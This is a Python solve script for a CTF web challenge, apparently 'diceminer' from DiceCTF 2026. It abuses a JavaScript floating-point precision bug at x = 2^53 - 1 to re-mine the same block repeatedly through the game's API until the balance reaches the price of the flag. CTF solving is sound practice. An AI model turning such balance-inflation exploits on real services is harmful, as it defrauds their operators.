#!/usr/bin/env python3
"""
Challenge: diceminer
Category:  web
Platform:  DiceCTF 2026

Bug: IEEE 754 float — 2^53 + 1 === 2^53 in JavaScript.
Start at x = 2^53-1. Dig RIGHT: step 1 mines block at 2^53 (new),
steps 2..range keep hitting same 2^53 key (float stuck) → re-mines.
earnings = reward * range, haulBase = reward * 1 → net ≈ 95% profit saved.
Each y level gives ONE exploit dig (block gets mined, switch level).
"""
import requests, sys, time

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://diceminer.chals.dicec.tf"
EXPLOIT_X = 9007199254740991   # 2^53 - 1

s = requests.Session()

def api(method, path, **kwargs):
    r = s.request(method, BASE + path, **kwargs)
    d = r.json()
    if not r.ok:
        raise RuntimeError(f"{path} → {d}")
    return d

def get_state():
    return api("GET", "/api/state")

def dig(direction):
    return api("POST", "/api/dig", json={"direction": direction})

def move_step(x, y):
    return api("POST", "/api/move", json={"x": x, "y": y})

def walk_to_y(target_y, cur_y):
    """Walk step by step from cur_y to target_y (all blocks must be mined)"""
    step = -1 if target_y < cur_y else 1
    for y in range(cur_y + step, target_y + step, step):
        move_step(EXPLOIT_X, y)
    return target_y

def buy(item):
    return api("POST", "/api/buy", json={"item": str(item)})

# ── Register + Start ─────────────────────────────────────────────
username = f"xpl{int(time.time()) % 100000}"
print(f"[*] Registering as {username}...")
api("POST", "/api/register", json={"username": username, "password": "h4ck3rpass"})
api("POST", "/api/start", json={"x": EXPLOIT_X})

# Starting at y=1
cur_y = 1

# ── PHASE 1: Wooden pickaxe (range=5) ────────────────────────────
# Dig DOWN from y=1: mines y=0,-1,-2,-3,-4 in column EXPLOIT_X
# Then move to each level and dig RIGHT (float bug: 5x same block)
# surface=10 → earnings=50, cost=9, net=41 per energy
print("\n[*] Phase 1: Wooden pickaxe")
dig("down")   # mines y=0,-1,-2,-3,-4
cur_y = -4    # we're still at y=1 (position not changed by dig), but blocks mined

st = get_state()
cur_y = st['y']   # y=1 (dig doesn't change position server-side)

# Move to y=0 step by step
cur_y = walk_to_y(0, cur_y)

# Exploit each depth level
balance = get_state()['balance']
for y in [0, -1, -2, -3, -4]:
    if balance >= 100:
        break
    if y != 0:
        cur_y = walk_to_y(y, cur_y)
    r = dig("right")
    balance = r['balance']
    print(f"    y={y}: net={r['net']}, balance={balance}")

buy(1)
balance = get_state()['balance']
print(f"[+] Stone Pickaxe bought, balance={balance}")

# ── PHASE 2: Stone pickaxe (range=15, tier=1) ────────────────────
# Dig down further, exploit at iron/coal levels
# iron reward=300, net per exploit dig: 15*300 - floor(300*0.95) = 4500-285 = 4215
print("\n[*] Phase 2: Stone pickaxe")

# Need to dig deeper. We're at y=-4 (or wherever cur_y is)
# Dig down mines EXPLOIT_X column from cur_y
cur_y = walk_to_y(-4, get_state()['y'])
dig("down")   # mines -5 to -19 (stone range=15)
cur_y = walk_to_y(-19, cur_y)
dig("down")   # mines -20 to -34 (covers iron at -15 to -30 range)

st = get_state()
cur_y = -19   # furthest we walked to

# Walk down and exploit each fresh y level (they're all mined now from dig down)
for y in range(-5, -35, -1):
    st = get_state()
    balance = st['balance']
    if balance >= 5000:
        break
    # Buy upgrades when possible
    if balance >= 500 and st['pickaxe'] < 2:
        buy(2)
        st = get_state()
        print(f"[+] Iron Pickaxe bought, balance={st['balance']}")
    cur_y = walk_to_y(y, cur_y)
    r = dig("right")
    st = get_state()
    balance = st['balance']
    print(f"    y={y} pkx={st['pickaxe']}: net={r['net']}, balance={balance}")

# If we need even more, go deeper with iron pickaxe
st = get_state()
if st['balance'] < 5000:
    cur_y = walk_to_y(-34, cur_y)
    dig("down")  # -35 to -74 (iron range=40)
    for y in range(-35, -75, -1):
        st = get_state()
        if st['balance'] >= 5000:
            break
        if st['balance'] >= 500 and st['pickaxe'] < 2:
            buy(2)
            st = get_state()
            print(f"[+] Iron Pickaxe bought, balance={st['balance']}")
        cur_y = walk_to_y(y, cur_y)
        try:
            r = dig("right")
            st = get_state()
            print(f"    y={y}: net={r['net']}, balance={st['balance']}")
        except:
            pass  # block might not be mineable with current tier

# Ensure iron pickaxe
st = get_state()
if st['pickaxe'] < 2 and st['balance'] >= 500:
    buy(2)

buy(3)
st = get_state()
print(f"[+] Gold Pickaxe bought, balance={st['balance']}")

# ── PHASE 3: Gold pickaxe (range=100) @ diamond (y<=-50) ─────────
# net per exploit dig = 100*1500 - floor(1500*0.95) = 150000-1425 = 148575
print("\n[*] Phase 3: Gold pickaxe @ diamond depth")

# Dig down from current position — gold range=100 mines 100 more blocks
st = get_state()
cur_y = st['y']
dig("down")   # Gold range=100: mines cur_y-1 to cur_y-100
# Walk down to y=-61 (diamond block — within the newly dug range)
cur_y = walk_to_y(-61, cur_y)

st = get_state()
print(f"    At y={st['y']}, energy={st['energy']}, balance={st['balance']}")

# Exploit each depth level for max profit
for y in range(-61, -162, -1):
    st = get_state()
    if st['balance'] >= 1_000_000:
        break
    if y != cur_y:
        # If block not yet mined, dig down further
        try:
            cur_y = walk_to_y(y, cur_y)
        except RuntimeError:
            # Need to dig down more
            dig("down")
            cur_y = walk_to_y(y, cur_y)
    try:
        r = dig("right")
        st = get_state()
        print(f"    y={y}: earnings={r['earnings']:,}, net={r['net']:,}, balance={st['balance']:,}")
    except Exception as e:
        pass  # skip non-mineable blocks

# ── Buy Flag ──────────────────────────────────────────────────────
st = get_state()
print(f"\n[+] Final balance: {st['balance']:,} / 1,000,000")
result = buy("flag")
print(f"\n[+] FLAG: {result['flag']}")
